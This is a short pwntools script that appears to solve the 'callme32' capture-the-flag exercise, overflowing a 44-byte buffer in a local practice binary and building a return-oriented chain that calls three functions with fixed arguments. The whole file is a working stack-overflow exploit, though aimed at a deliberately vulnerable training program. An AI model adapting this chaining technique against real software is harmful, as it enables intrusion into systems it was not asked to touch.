from pwn import *

context.log_level = 'debug'

#addresses 
callme1 = 0x080485c0
callme2 = 0x08048620
callme3 = 0x080485b0
arg1 = 0x1
arg2 = 0x2
arg3 = 0x3
#pop pop pop ret
addy = 0x080488a9

def main():

    elf = context.binary = ELF('callme32')

    p = process(elf.path)

    payload = 'A'*44 
    rop = p32(callme1)
    rop += p32(addy)
    rop += p32(arg1)
    rop += p32(arg2)
    rop += p32(arg3)
    rop += p32(callme2)
    rop += p32(addy)
    rop += p32(arg1)
    rop += p32(arg2)
    rop += p32(arg3)
    rop += p32(callme3)
    rop += p32(addy)
    rop += p32(arg1)
    rop += p32(arg2)
    rop += p32(arg3)
    payload += rop

    f = open("pattern.txt", "w")
    f.write(payload)
    f.close()

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

